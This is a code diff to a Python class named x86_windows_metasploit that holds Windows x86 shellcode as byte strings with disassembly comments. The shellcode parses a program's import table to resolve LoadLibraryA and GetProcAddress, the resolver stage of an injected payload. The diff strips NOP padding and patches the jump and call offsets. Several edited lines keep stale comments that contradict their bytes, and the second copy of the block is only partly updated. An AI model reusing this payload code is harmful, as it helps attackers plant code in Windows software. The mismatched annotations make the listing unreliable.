@@ -418,29 +418,22 @@ class x86_windows_metasploit:
              "\x8b\x12"                     # 00000030  8B12              mov edx,[edx]
              "\x75\xdb"                     # 00000032  75DB              jnz 0xf
              # iatparser
-             "\x90"                         # 00000034  90                nop
-             "\x90"                         # 00000035  90                nop
-             "\x90"                         # 00000036  90                nop
              "\x89\xda"                     # 00000037  89DA              mov edx,ebx
              "\x03\x52\x3c"                 # 00000039  03523C            add edx,[edx+0x3c]
              "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
              "\x01\xdf"                     # 00000042  01DF              add edi,ebx
              # findImport
-             "\x90"                         # 00000044  90                nop
-             "\x90"                         # 00000045  90                nop
              "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
              "\x01\xda"                     # 00000049  01DA              add edx,ebx
              "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
              "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
              "\x74\x05"                     # 00000058  7405              jz 0x5f
              "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
-             "\xeb\xe5"                     # 0000005D  EBE5              jmp short 0x44
+             "\xeb\xe7"                     # 0000005D  EBE5              jmp short 0x44
              # saveBase
              "\x57"                         # 0000005F  57                push edi
-             "\xeb\x3d"                     # 00000060  EB3D              jmp short 0x9f
+             "\xeb\x39"                     # 00000060  EB3D              jmp short 0x9f
              # setbounds
-             "\x90"                         # 00000062  90                nop
-             "\x90"                         # 00000063  90                nop
              "\x8b\x57\x10"                 # 00000064  8B5710            mov edx,[edi+0x10]
              "\x01\xda"                     # 00000067  01DA              add edx,ebx
              "\x8b\x37"                     # 00000069  8B37              mov esi,[edi]
@@ -449,8 +442,6 @@ class x86_windows_metasploit:
              "\x81\xc1\x00\x00\xff\x00"     # 0000006F  81C10000FF00      add ecx,0xff0000
              "\x31\xed"                     # 00000075  31ED              xor ebp,ebp
              # findApi
-             "\x90"                         # 00000077  90                nop
-             "\x90"                         # 00000078  90                nop
              "\x8b\x06"                     # 00000079  8B06              mov eax,[esi]
              "\x01\xd8"                     # 0000007B  01D8              add eax,ebx
              "\x83\xc0\x02"                 # 0000007D  83C002            add eax,byte +0x2
@@ -466,20 +457,18 @@ class x86_windows_metasploit:
              # Increment
              "\x83\xc5\x04"                 # 00000097  83C504            add ebp,byte +0x4
              "\x83\xc6\x04"                 # 0000009A  83C604            add esi,byte +0x4
-             "\xeb\xd8"                     # 0000009D  EBD8              jmp short 0x77
+             "\xeb\xda"                     # 0000009D  EBD8              jmp short 0x77
              # loadApis
-             "\x90"                         # 0000009F  90                nop
-             "\x90"                         # 000000A0  90                nop
              "\x68\x61\x72\x79\x41"         # 000000A1  6861727941        push dword 0x41797261
              "\x68\x4c\x6f\x61\x64"         # 000000A6  684C6F6164        push dword 0x64616f4c
-             "\xe8\xb2\xff\xff\xff"         # 000000AB  E8B2FFFFFF        call dword 0x62
+             "\xe8\xb8\xff\xff\xff"         # 000000AB  E8B2FFFFFF        call dword 0x62
              "\x01\xea"                     # 000000B0  01EA              add edx,ebp
              "\x83\xc4\x08"                 # 000000B2  83C408            add esp,byte +0x8
              "\x5f"                         # 000000B5  5F                pop edi
              "\x52"                         # 000000B6  52                push edx
              "\x68\x64\x64\x72\x65"         # 000000B7  6864647265        push dword 0x65726464
              "\x68\x47\x65\x74\x50"         # 000000BC  6847657450        push dword 0x50746547
-             "\xe8\x9c\xff\xff\xff"         # 000000C1  E89CFFFFFF        call dword 0x62
+             "\xe8\xA2\xff\xff\xff"         # 000000C1  E89CFFFFFF        call dword 0x62
              "\x01\xea"                     # 000000C6  01EA              add edx,ebp
              "\x5d"                         # 000000C8  5D                pop ebp
              "\x5d"                         # 000000C9  5D                pop ebp
@@ -523,23 +512,18 @@ class x86_windows_metasploit:
                      "\x8b\x12"                     # 00000030  8B12              mov edx,[edx]
                      "\x75\xdb"                     # 00000032  75DB              jnz 0xf
                      # iatparser
-                     "\x90"                         # 00000034  90                nop
-                     "\x90"                         # 00000035  90                nop
-                     "\x90"                         # 00000036  90                nop
                      "\x89\xda"                     # 00000037  89DA              mov edx,ebx
                      "\x03\x52\x3c"                 # 00000039  03523C            add edx,[edx+0x3c]
                      "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
                      "\x01\xdf"                     # 00000042  01DF              add edi,ebx
                      # findImport
-                     "\x90"                         # 00000044  90                nop
-                     "\x90"                         # 00000045  90                nop
                      "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
                      "\x01\xda"                     # 00000049  01DA              add edx,ebx
                      "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
                      "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
                      "\x74\x05"                     # 00000058  7405              jz 0x5f
                      "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
-                     "\xeb\xe5"                     # 0000005D  EBE5              jmp short 0x44
+                     "\xeb\xe7"                     # 0000005D  EBE5              jmp short 0x44
                      # saveBase
                      "\x57"                         # 0000005F  57                push edi
                      "\xeb\x3d"                     # 00000060  EB3D              jmp short 0x9f
